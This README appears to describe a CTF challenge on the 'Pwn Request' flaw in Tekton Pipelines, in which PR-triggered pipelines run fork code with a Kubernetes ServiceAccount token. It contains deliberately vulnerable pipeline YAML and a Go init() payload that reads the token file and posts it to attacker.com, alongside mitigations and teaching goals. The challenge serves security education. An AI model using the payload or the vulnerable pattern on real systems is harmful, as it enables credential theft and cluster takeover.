# Tekton "Pwn Request" CTF Challenge

This directory contains a complete CTF challenge demonstrating the "Pwn Request" vulnerability in Tekton Pipelines - the Tekton equivalent of the GitHub Actions `pull_request_target` vulnerability.

## Overview

**Attack Type:** Token Theft via Poisoned Go Script
**Inspired by:** [StepSecurity's HackerBot CLAW GitHub Actions Exploitation](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation#attack-1-avelinoawesome-go---token-theft-via-poisoned-go-script)

**Key Difference:** While GitHub Actions exposes a scoped `GITHUB_TOKEN`, Tekton exposes a Kubernetes ServiceAccount token with potentially cluster-wide access, making this attack MORE dangerous.

## Attack Summary

1. **Vulnerable Pattern**: EventListener triggers pipeline on pull requests
2. **Untrusted Code Execution**: Pipeline clones and executes code from PR fork
3. **Token Exposure**: Malicious code runs with Kubernetes ServiceAccount permissions
4. **Exfiltration**: Attacker steals token and accesses cluster resources (including secrets)

## Directory Structure

```
tekton/
├── README.md                          # This file
├── SETUP-GUIDE.md                     # Detailed setup instructions
├── pipelines/
│   └── vulnerable-pr-quality-pipeline.yaml    # The vulnerable pipeline
├── tasks/
│   ├── supporting-tasks.yaml          # Helper tasks (git-clone, etc.)
│   └── vulnerable-quality-check-task.yaml     # Task that executes untrusted code
├── triggers/
│   └── vulnerable-eventlistener.yaml  # EventListener, bindings, templates
└── challenges/
    ├── CTF-CHALLENGE-GUIDE.md         # Challenge instructions for participants
    ├── malicious-payload-example.go   # Example exploit code
    └── victim-repo-sample/            # Sample vulnerable repository
        ├── README.md
        ├── scripts/
        │   └── quality-check/
        │       └── main.go            # Benign quality check script
        └── .tekton/
            └── README.md              # CI/CD documentation
```

## Quick Start

### For CTF Organizers

```bash
# 1. Setup Kubernetes cluster with Tekton
make setup

# TODO: remove - the following steps 2 and 3 are performed by make setup
# # 2. Install CTF challenge resources
# kubectl apply -f tekton/triggers/vulnerable-eventlistener.yaml
# kubectl apply -f tekton/tasks/
# kubectl apply -f tekton/pipelines/

# # 3. Create flag secret
# kubectl create secret generic ctf-flag \
#   --from-literal=flag='FLAG{t3kt0n_pwn_r3qu3st_1s_d4ng3r0us}' \
#   -n default

# 4. Setup victim repository
mkdir victim-repo
cp -r tekton/challenges/victim-repo-sample/* victim-repo/
cd victim-repo
git init && git add . && git commit -m "Initial commit"
git push <your-git-server>

# 5. Test the challenge
tkn pipeline start pr-quality-check-pipeline \
  --param pr-repo-url=<victim-repo-url> \
  --param pr-sha=main \
  --param pr-number=1 \
  --workspace name=source,emptyDir="" \
  --showlog
```

### For CTF Participants

See `challenges/CTF-CHALLENGE-GUIDE.md` for complete challenge instructions.

**Goal:** Exploit the vulnerable pipeline to retrieve the flag from the `ctf-flag` Kubernetes secret.

## The Vulnerability Explained

### GitHub Actions Equivalent

In GitHub Actions, the `pull_request_target` trigger is dangerous when combined with checking out PR code:

```yaml
on:
  pull_request_target:  # Runs with target repo permissions

jobs:
  quality-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Attacker's code!
      - run: |
          cd .github/scripts/check-quality/
          go run .  # Executes attacker's code with GITHUB_TOKEN!
```

### Tekton Equivalent

In Tekton, an EventListener triggers on PR events and runs untrusted code:

```yaml
# EventListener receives webhook on PR events
apiVersion: triggers.tekton.dev/v1beta1
kind: EventListener
metadata:
  name: pr-quality-check-listener
spec:
  serviceAccountName: tekton-triggers-sa  # Has cluster permissions!
  triggers:
    - name: pull-request-quality-check
      interceptors:
        - ref:
            name: "github"
          params:
            - name: "eventTypes"
              value: ["pull_request"]
```

The triggered pipeline:
```yaml
# Clones attacker's fork
- name: clone-pr-code
  params:
    - name: url
      value: $(params.pr-repo-url)  # Attacker's fork!
    - name: revision
      value: $(params.pr-sha)       # Attacker's code!

# Executes untrusted code
- name: run-quality-checks
  script: |
    cd scripts/quality-check
    go run .  # Runs attacker's code with K8s ServiceAccount!
```

### Why This Is More Dangerous Than GitHub Actions

| Aspect | GitHub Actions | Tekton Pipelines |
|--------|----------------|------------------|
| Token Type | Scoped `GITHUB_TOKEN` | Kubernetes ServiceAccount |
| Permissions | Limited to repo/org | Potentially cluster-wide |
| Access Scope | GitHub API only | Entire Kubernetes cluster |
| Secrets | Workflow secrets only | All K8s secrets (with RBAC) |
| Persistence | Ephemeral runner | Can create persistent resources |
| Lateral Movement | Limited | Can attack other namespaces/pods |

## Attack Demonstration

### Malicious Payload (Go init() function)

```go
package main

import (
    "io/ioutil"
    "net/http"
)

// Executes before main() - perfect for stealth!
func init() {
    token, _ := ioutil.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")

    // Exfiltrate to attacker server
    http.Post("http://attacker.com/loot",
              "text/plain",
              strings.NewReader(string(token)))
}

func main() {
    // Legitimate-looking output
    fmt.Println("✓ Quality checks passed!")
}
```

### What Attacker Gets

With the stolen Kubernetes ServiceAccount token:
- Access to Kubernetes API
- Read secrets (including the flag)
- Create/modify pods and deployments
- Potentially escalate to cluster-admin
- Establish persistence
- Lateral movement to other namespaces

## Learning Objectives

By completing this challenge, participants learn:

1. **CI/CD Supply Chain Attacks**
   - How automated pipelines can be exploited
   - The difference between trusted and untrusted code execution

2. **Kubernetes Security**
   - ServiceAccount tokens and RBAC
   - How to interact with Kubernetes API
   - Secret management and access control

3. **Tekton Pipelines Security**
   - EventListener security patterns
   - Dangerous trigger configurations
   - Workspace and permission management

4. **Exploitation Techniques**
   - Code injection via init() functions
   - Token exfiltration methods
   - API enumeration and access

5. **Defensive Measures**
   - How to configure Tekton securely
   - RBAC least privilege
   - Network policies for isolation
   - Proper PR validation patterns

## Mitigations

### 1. Separate Pipelines for Untrusted Code

```yaml
# Untrusted PR pipeline - restricted permissions
apiVersion: tekton.dev/v1beta1
kind: Pipeline
metadata:
  name: pr-validation-untrusted
  namespace: pr-sandbox  # Isolated namespace
spec:
  # ... minimal permissions, no secret access
```

### 2. Minimal RBAC

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pr-pipeline-role
rules:
  - apiGroups: [""]
    resources: ["pods", "pods/log"]
    verbs: ["get", "list"]
  # NO secrets, NO configmaps, NO other namespaces
```

### 3. Network Policies

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-egress-from-pr-pipelines
spec:
  podSelector:
    matchLabels:
      pipeline-type: untrusted-pr
  policyTypes:
    - Egress
  egress:
    - to:
        - namespaceSelector:
            matchLabels:
              name: kube-system
      ports:
        - protocol: UDP
          port: 53  # DNS only - no exfiltration!
```

### 4. Don't Execute Arbitrary Code

```yaml
# BAD: Executes untrusted code
- script: |
    cd scripts
    go run .  # ❌ Attacker controls this!

# GOOD: Use static analysis only
- script: |
    golangci-lint run  # ✓ No code execution
```

## CTF Variations

1. **Basic**: Flag in environment variable
2. **Medium**: Flag in Kubernetes secret (this challenge)
3. **Hard**: Multi-stage - token theft + privilege escalation + persistence
4. **Expert**: Detection evasion - exfiltrate without triggering alarms

## Files Reference

### Configuration Files
- `vulnerable-eventlistener.yaml` - EventListener with dangerous trigger pattern
- `vulnerable-pr-quality-pipeline.yaml` - Pipeline that executes untrusted code
- `vulnerable-quality-check-task.yaml` - Task with code execution vulnerability

### Educational Resources
- `CTF-CHALLENGE-GUIDE.md` - Complete challenge walkthrough
- `malicious-payload-example.go` - Commented exploit code
- `SETUP-GUIDE.md` - Deployment instructions

### Victim Repository
- `victim-repo-sample/` - Sample vulnerable project
  - Includes benign quality check script
  - README explaining CI/CD setup
  - Documentation of Tekton configuration

## Related Resources

- **Original Attack**: [StepSecurity HackerBot CLAW](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
- **Attack Analysis**: See `../ATTACK-ANALYSIS.md`
- **Tekton Security**: [Official Tekton Security Docs](https://tekton.dev/docs/pipelines/security/)
- **Kubernetes RBAC**: [K8s RBAC Documentation](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)

## Testing

```bash
# Start a test pipeline run
tkn pipeline start pr-quality-check-pipeline \
  --param pr-repo-url=https://github.com/victim/repo.git \
  --param pr-sha=main \
  --param pr-number=1 \
  --workspace name=source,emptyDir="" \
  --showlog

# View logs
tkn pipelinerun logs --last -f

# Check if task accessed secrets
kubectl get events --sort-by='.lastTimestamp' | grep secret
```

## Support

- Setup issues: See `SETUP-GUIDE.md`
- Challenge questions: See `challenges/CTF-CHALLENGE-GUIDE.md`
- Tekton issues: Check logs with `kubectl logs` and `tkn logs`

## Warning

⚠️ **FOR EDUCATIONAL PURPOSES ONLY**

This challenge demonstrates real security vulnerabilities. Do NOT:
- Deploy this on production clusters
- Use real secrets or credentials
- Test on systems you don't own
- Use techniques for malicious purposes

This is designed for authorized CTF competitions and security education only.

## License

Educational use only. See repository LICENSE file.
